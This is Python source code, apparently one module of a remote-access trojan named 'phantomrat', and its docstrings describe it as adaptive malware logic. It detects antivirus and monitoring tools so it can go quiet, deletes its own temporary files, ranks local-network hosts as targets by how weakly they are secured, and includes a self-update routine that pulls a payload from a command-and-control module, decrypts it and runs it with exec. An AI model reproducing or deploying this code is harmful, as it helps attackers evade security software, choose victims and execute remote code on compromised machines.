import psutil
import time
import random
import json
import threading
import queue
import numpy as np
from datetime import datetime, timedelta
import hashlib
from collections import deque, Counter
import logging

logger = logging.getLogger(__name__)

class AdaptiveBusinessLogic:
    """
    AI-driven business logic for dynamic malware adaptation
    Implements ML techniques for optimal operation
    """
    
    def __init__(self):
        self.environment_history = deque(maxlen=1000)
        self.operation_log = deque(maxlen=500)
        self.threat_level = 0.0  # 0.0 (safe) to 1.0 (high threat)
        self.stealth_mode = True
        self.resource_budget = 0.5  # 0.0 to 1.0 - how much resources to use
        
        # ML model parameters (simplified)
        self.pattern_weights = {
            'cpu_spike': 0.8,
            'memory_high': 0.6,
            'network_burst': 0.7,
            'user_active': 0.9,
            'security_process': 1.0,
            'idle_time': -0.5,
            'night_hours': -0.3
        }
        
        # Operation patterns
        self.successful_patterns = []
        self.failed_patterns = []
        
        # Learning rate
        self.learning_rate = 0.1
        
        # Initialize
        self.load_models()
        
    def load_models(self):
        """Load saved models if available"""
        try:
            with open('business_models.json', 'r') as f:
                data = json.load(f)
                self.pattern_weights.update(data.get('weights', {}))
                self.successful_patterns = data.get('successful', [])
                self.failed_patterns = data.get('failed', [])
        except:
            pass
    
    def save_models(self):
        """Save learned models"""
        data = {
            'weights': self.pattern_weights,
            'successful': self.successful_patterns[-100:],  # Keep recent
            'failed': self.failed_patterns[-100:],
            'timestamp': datetime.now().isoformat()
        }
        try:
            with open('business_models.json', 'w') as f:
                json.dump(data, f)
        except:
            pass
    
    def check_environment(self):
        """Comprehensive environment analysis"""
        env = {
            'timestamp': time.time(),
            'cpu': psutil.cpu_percent(interval=1),
            'cpu_per_core': psutil.cpu_percent(interval=1, percpu=True),
            'memory': psutil.virtual_memory().percent,
            'memory_available': psutil.virtual_memory().available,
            'disk': psutil.disk_usage('/').percent,
            'network': psutil.net_io_counters(),
            'process_count': len(list(psutil.process_iter())),
            'users': self._get_active_users(),
            'time_of_day': datetime.now().hour,
            'day_of_week': datetime.now().weekday(),
            'uptime': time.time() - psutil.boot_time()
        }
        
        # Calculate threat indicators
        env['threat_indicators'] = self._calculate_threat_indicators(env)
        env['threat_level'] = sum(env['threat_indicators'].values()) / len(env['threat_indicators'])
        
        # Store in history
        self.environment_history.append(env)
        
        return env
    
    def _calculate_threat_indicators(self, env):
        """Calculate various threat indicators"""
        indicators = {}
        
        # CPU threat (spikes, high usage)
        cpu_variance = np.var(env['cpu_per_core']) if env['cpu_per_core'] else 0
        indicators['cpu_spike'] = min(1.0, cpu_variance / 100)
        indicators['cpu_high'] = min(1.0, env['cpu'] / 100)
        
        # Memory threat
        indicators['memory_high'] = min(1.0, env['memory'] / 100)
        
        # Network threat (unusual patterns)
        net = env['network']
        if len(self.environment_history) > 1:
            last_net = self.environment_history[-2]['network']
            bytes_change = abs(net.bytes_sent - last_net.bytes_sent) + abs(net.bytes_recv - last_net.bytes_recv)
            indicators['network_burst'] = min(1.0, bytes_change / (1024 * 1024))  # MB change
        else:
            indicators['network_burst'] = 0
        
        # User activity threat
        indicators['user_active'] = 1.0 if env['users'] > 0 else 0.0
        
        # Security software threat
        indicators['security_process'] = self._check_security_processes()
        
        # Time-based factors (lower threat at night)
        hour = env['time_of_day']
        if 2 <= hour <= 6:  # 2AM to 6AM
            indicators['night_hours'] = -0.5
        else:
            indicators['night_hours'] = 0
        
        # Idle system (lower threat)
        if env['cpu'] < 10 and env['memory'] < 30:
            indicators['idle_time'] = -0.3
        else:
            indicators['idle_time'] = 0
        
        return indicators
    
    def _check_security_processes(self):
        """Check for security-related processes"""
        security_processes = [
            'avast', 'avg', 'bitdefender', 'kaspersky', 'mcafee',
            'norton', 'symantec', 'windowsdefender', 'malwarebytes',
            'wireshark', 'procmon', 'processhacker', 'autoruns',
            'taskmgr', 'resourcemon', 'perfmon'
        ]
        
        try:
            for proc in psutil.process_iter(['name']):
                name = proc.info['name'].lower()
                if any(sec in name for sec in security_processes):
                    return 1.0
        except:
            pass
        
        return 0.0
    
    def _get_active_users(self):
        """Get number of active users"""
        try:
            return len([u for u in psutil.users() if time.time() - u.started < 300])
        except:
            return 0
    
    def adapt_activity(self):
        """Adapt malware activity based on environment"""
        env = self.check_environment()
        threat_level = env['threat_level']
        
        # Update global threat level with smoothing
        self.threat_level = 0.7 * self.threat_level + 0.3 * threat_level
        
        # Determine action based on threat level
        if self.threat_level > 0.8:
            action = self._high_threat_strategy(env)
        elif self.threat_level > 0.5:
            action = self._medium_threat_strategy(env)
        else:
            action = self._low_threat_strategy(env)
        
        # Log the decision
        self.operation_log.append({
            'timestamp': time.time(),
            'threat_level': self.threat_level,
            'action': action,
            'env_summary': {
                'cpu': env['cpu'],
                'memory': env['memory'],
                'users': env['users']
            }
        })
        
        # Execute adaptation
        self._execute_adaptation(action)
        
        return action
    
    def _high_threat_strategy(self, env):
        """Strategy for high threat environments"""
        return {
            'sleep_duration': random.randint(300, 600),  # 5-10 minutes
            'resource_usage': 0.1,  # Minimal
            'network_activity': False,
            'aggressive': False,
            'stealth': 'maximum',
            'message': 'High threat detected, maximum stealth'
        }
    
    def _medium_threat_strategy(self, env):
        """Strategy for medium threat environments"""
        # Use ML to choose best strategy
        strategies = [
            {
                'sleep_duration': random.randint(60, 180),
                'resource_usage': 0.3,
                'network_activity': True,
                'aggressive': False,
                'stealth': 'high',
                'message': 'Medium threat, cautious operation'
            },
            {
                'sleep_duration': random.randint(30, 90),
                'resource_usage': 0.5,
                'network_activity': True,
                'aggressive': True,
                'stealth': 'medium',
                'message': 'Medium threat, balanced operation'
            }
        ]
        
        # Choose based on time of day
        hour = env['time_of_day']
        if 0 <= hour <= 6:  # Night
            return strategies[1]  # More aggressive at night
        else:
            return strategies[0]  # More cautious during day
    
    def _low_threat_strategy(self, env):
        """Strategy for low threat environments"""
        # Check if system is idle
        if env['cpu'] < 20 and env['memory'] < 40:
            return {
                'sleep_duration': random.randint(10, 30),
                'resource_usage': 0.8,
                'network_activity': True,
                'aggressive': True,
                'stealth': 'normal',
                'message': 'Low threat, idle system, aggressive operation'
            }
        else:
            return {
                'sleep_duration': random.randint(30, 60),
                'resource_usage': 0.6,
                'network_activity': True,
                'aggressive': True,
                'stealth': 'normal',
                'message': 'Low threat, normal operation'
            }
    
    def _execute_adaptation(self, action):
        """Execute the adaptation strategy"""
        logger.info(f"Adapting: {action['message']}")
        
        # Set resource budget
        self.resource_budget = action['resource_usage']
        
        # Adjust stealth mode
        if action['stealth'] == 'maximum':
            self.stealth_mode = True
            self._enable_maximum_stealth()
        elif action['stealth'] == 'high':
            self.stealth_mode = True
        else:
            self.stealth_mode = False
        
        # Sleep if needed
        if action.get('sleep_duration', 0) > 0:
            time.sleep(action['sleep_duration'])
    
    def _enable_maximum_stealth(self):
        """Enable maximum stealth measures"""
        # Reduce CPU usage
        import os
        if hasattr(os, 'nice'):
            os.nice(10)  # Lower priority
        
        # Clear recent logs
        self._clear_temporary_files()
    
    def _clear_temporary_files(self):
        """Clear temporary files to reduce footprint"""
        temp_dirs = ['/tmp', '/var/tmp', os.environ.get('TEMP', ''), os.environ.get('TMP', '')]
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                try:
                    for file in os.listdir(temp_dir):
                        if file.startswith('phantom_'):
                            os.remove(os.path.join(temp_dir, file))
                except:
                    pass
    
    def prioritize_targets(self, targets):
        """Prioritize targets using ML scoring"""
        if not targets:
            return []
        
        scored_targets = []
        for target in targets:
            score = self._calculate_target_score(target)
            scored_targets.append({
                **target,
                'score': score,
                'priority': self._score_to_priority(score)
            })
        
        # Sort by score (descending)
        scored_targets.sort(key=lambda x: x['score'], reverse=True)
        
        return scored_targets
    
    def _calculate_target_score(self, target):
        """Calculate ML-based score for target"""
        score = 0.0
        
        # Value-based scoring
        value = target.get('value', 0)
        score += min(value / 100, 1.0) * 0.4
        
        # Accessibility scoring
        if target.get('accessibility', 'low') == 'high':
            score += 0.3
        elif target.get('accessibility') == 'medium':
            score += 0.15
        
        # Security scoring (inverse)
        security = target.get('security_level', 'medium')
        if security == 'low':
            score += 0.2
        elif security == 'high':
            score -= 0.2
        
        # Time-based scoring (prefer nights)
        hour = datetime.now().hour
        if 0 <= hour <= 6:
            score += 0.1
        
        # Network proximity scoring
        if target.get('local_network', False):
            score += 0.15
        
        # Historical success rate
        target_hash = hashlib.md5(json.dumps(target, sort_keys=True).encode()).hexdigest()
        if target_hash in self.successful_patterns:
            score += 0.2
        elif target_hash in self.failed_patterns:
            score -= 0.1
        
        return min(max(score, 0.0), 1.0)
    
    def _score_to_priority(self, score):
        """Convert score to priority level"""
        if score >= 0.8:
            return 'critical'
        elif score >= 0.6:
            return 'high'
        elif score >= 0.4:
            return 'medium'
        elif score >= 0.2:
            return 'low'
        else:
            return 'ignore'
    
    def learn_from_outcome(self, target, success, metrics=None):
        """Learn from operation outcome to improve future decisions"""
        target_hash = hashlib.md5(json.dumps(target, sort_keys=True).encode()).hexdigest()
        
        if success:
            if target_hash not in self.successful_patterns:
                self.successful_patterns.append(target_hash)
                
                # Update weights based on successful pattern
                self._reinforce_successful_pattern(target)
        else:
            if target_hash not in self.failed_patterns:
                self.failed_patterns.append(target_hash)
                
                # Update weights based on failed pattern
                self._learn_from_failure(target)
        
        # Save updated models periodically
        if random.random() < 0.1:  # 10% chance on each outcome
            self.save_models()
    
    def _reinforce_successful_pattern(self, target):
        """Reinforce weights for successful patterns"""
        # Increase weights for characteristics present in successful target
        if target.get('local_network', False):
            self.pattern_weights['local_network'] = min(1.0, 
                self.pattern_weights.get('local_network', 0) + self.learning_rate)
        
        if target.get('security_level') == 'low':
            self.pattern_weights['low_security'] = min(1.0,
                self.pattern_weights.get('low_security', 0) + self.learning_rate)
    
    def _learn_from_failure(self, target):
        """Learn from failed patterns"""
        # Decrease weights for characteristics present in failed target
        if target.get('security_level') == 'high':
            self.pattern_weights['high_security'] = max(0.0,
                self.pattern_weights.get('high_security', 1.0) - self.learning_rate)
    
    def predict_optimal_time(self, operation_type='network'):
        """Predict optimal time for operation using ML"""
        # Analyze historical success patterns
        successful_times = []
        for log in self.operation_log:
            if log.get('success', False):
                successful_times.append(datetime.fromtimestamp(log['timestamp']).hour)
        
        if not successful_times:
            # Default to night hours if no data
            return random.choice([2, 3, 4, 5])  # 2AM to 5AM
        
        # Find most successful hour
        hour_counts = Counter(successful_times)
        best_hour = hour_counts.most_common(1)[0][0]
        
        # Add some randomness
        hour_variation = random.randint(-2, 2)
        optimal_hour = (best_hour + hour_variation) % 24
        
        return optimal_hour
    
    def get_performance_metrics(self):
        """Get performance metrics for reporting"""
        if not self.operation_log:
            return {}
        
        recent_ops = list(self.operation_log)[-50:]  # Last 50 operations
        
        successes = sum(1 for op in recent_ops if op.get('success', False))
        failures = len(recent_ops) - successes
        success_rate = successes / len(recent_ops) if recent_ops else 0
        
        avg_threat = np.mean([op.get('threat_level', 0) for op in recent_ops])
        avg_response_time = np.mean([op.get('response_time', 0) for op in recent_ops if 'response_time' in op])
        
        return {
            'total_operations': len(self.operation_log),
            'recent_success_rate': success_rate,
            'avg_threat_level': avg_threat,
            'avg_response_time': avg_response_time,
            'current_resource_budget': self.resource_budget,
            'stealth_mode': self.stealth_mode,
            'model_accuracy': self._calculate_model_accuracy()
        }
    
    def _calculate_model_accuracy(self):
        """Calculate ML model accuracy (simplified)"""
        if len(self.operation_log) < 10:
            return 0.5  # Default accuracy
        
        # Simple accuracy calculation based on success rate
        recent = list(self.operation_log)[-20:]
        correct_predictions = sum(1 for op in recent 
                                 if (op.get('predicted_success', True) and op.get('success', False)) or
                                    (not op.get('predicted_success', True) and not op.get('success', False)))
        
        return correct_predictions / len(recent) if recent else 0.5
    
    def optimize_resources(self):
        """Optimize resource usage based on environment"""
        env = self.check_environment()
        
        # Dynamic resource allocation
        cpu_available = 100 - env['cpu']
        mem_available = 100 - env['memory']
        
        # Calculate safe resource usage
        safe_cpu = min(cpu_available * 0.3, 30)  # Use up to 30% of available CPU
        safe_mem = min(mem_available * 0.2, 20)  # Use up to 20% of available memory
        
        # Adjust based on threat level
        if self.threat_level > 0.7:
            safe_cpu *= 0.5
            safe_mem *= 0.5
        
        return {
            'max_cpu_percent': safe_cpu,
            'max_memory_mb': safe_mem * (psutil.virtual_memory().total / (1024*1024*100)),
            'network_bandwidth_kbps': 100 if self.threat_level < 0.5 else 10
        }

# Singleton instance
_business_logic = None

def get_business_logic():
    """Get or create business logic instance"""
    global _business_logic
    if _business_logic is None:
        _business_logic = AdaptiveBusinessLogic()
    return _business_logic

def adapt_activity():
    """Main adaptation function"""
    logic = get_business_logic()
    return logic.adapt_activity()

def prioritize_targets(targets):
    """Prioritize targets"""
    logic = get_business_logic()
    return logic.prioritize_targets(targets)

def self_update():
    """Self-update mechanism"""
    print("[*] Checking for updates...")
    
    # Check C2 for updates
    from phantomrat_cloud import fetch_task
    update_task = fetch_task()
    
    if update_task and update_task.get('type') == 'update':
        print("[+] Update available, applying...")
        apply_update(update_task.get('payload'))
        return True
    
    print("[-] No updates available")
    return False

def apply_update(update_payload):
    """Apply update payload"""
    try:
        # Decrypt and execute update
        from cryptography.fernet import Fernet
        import base64
        
        # Load encryption key
        with open('malleable_profile.json', 'r') as f:
            profile = json.load(f)
        
        key = profile['encryption']['key'].encode()
        if len(key) < 32:
            key = key.ljust(32)[:32]
        
        fernet = Fernet(base64.urlsafe_b64encode(key))
        
        # Decrypt update
        update_code = fernet.decrypt(update_payload.encode()).decode()
        
        # Execute update in safe context
        exec_globals = {'__builtins__': __builtins__}
        exec(update_code, exec_globals)
        
        print("[+] Update applied successfully")
        return True
        
    except Exception as e:
        print(f"[-] Update failed: {e}")
        return False

if __name__ == "__main__":
    # Test the business logic
    print("Testing Adaptive Business Logic...")
    
    logic = AdaptiveBusinessLogic()
    
    # Simulate environment checks
    for i in range(5):
        print(f"\n--- Iteration {i+1} ---")
        
        # Check environment
        env = logic.check_environment()
        print(f"Threat level: {logic.threat_level:.2f}")
        print(f"CPU: {env['cpu']}%, Memory: {env['memory']}%")
        
        # Adapt activity
        action = logic.adapt_activity()
        print(f"Action: {action['message']}")
        print(f"Sleep: {action.get('sleep_duration', 0)}s")
        
        time.sleep(2)
    
    # Test target prioritization
    targets = [
        {'ip': '192.168.1.100', 'value': 80, 'accessibility': 'high', 'security_level': 'low'},
        {'ip': '192.168.1.101', 'value': 95, 'accessibility': 'medium', 'security_level': 'high'},
        {'ip': '192.168.1.102', 'value': 60, 'accessibility': 'low', 'security_level': 'medium'}
    ]
    
    prioritized = logic.prioritize_targets(targets)
    print("\nPrioritized Targets:")
    for target in prioritized:
        print(f"  {target['ip']}: score={target['score']:.2f}, priority={target['priority']}")
    
    # Show performance metrics
    metrics = logic.get_performance_metrics()
    print("\nPerformance Metrics:")
    for key, value in metrics.items():
        print(f"  {key}: {value}")
